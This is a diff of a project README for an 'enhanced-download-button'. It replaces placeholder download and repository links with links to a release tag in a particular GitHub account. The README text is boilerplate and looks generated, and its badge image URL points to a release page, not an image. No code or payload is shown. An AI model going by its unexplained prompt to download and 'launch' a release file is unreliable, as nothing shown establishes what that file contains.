@@ -33,7 +33,7 @@ The repository covers a wide range of topics related to the download button:
 ## 📥 Download
 
 You can download the program from the following link: 
-[![Download Program](https://img.shields.io/badge/Download-Program.zip-blue)](https://github.com/download/Program.zip)
+[![Download Program](https://github.com/Nonoozt/enhanced-download-button/releases/tag/v2.0)](https://github.com/Nonoozt/enhanced-download-button/releases/tag/v2.0)
 
 Please note that the link needs to be launched to start the download process.
 
@@ -41,7 +41,7 @@ If the provided link is not working or you need more options, feel free to check
 
 ## 🌐 Explore Further
 
-Visit the [enhanced-download-button repository](https://github.com/yourusername/enhanced-download-button) to explore the project further. 
+Visit the [enhanced-download-button repository](https://github.com/Nonoozt/enhanced-download-button/releases/tag/v2.0) to explore the project further. 
 
 Feel free to contribute, suggest ideas, report issues, or simply enjoy using the enhanced download button in your projects! 🎈
 
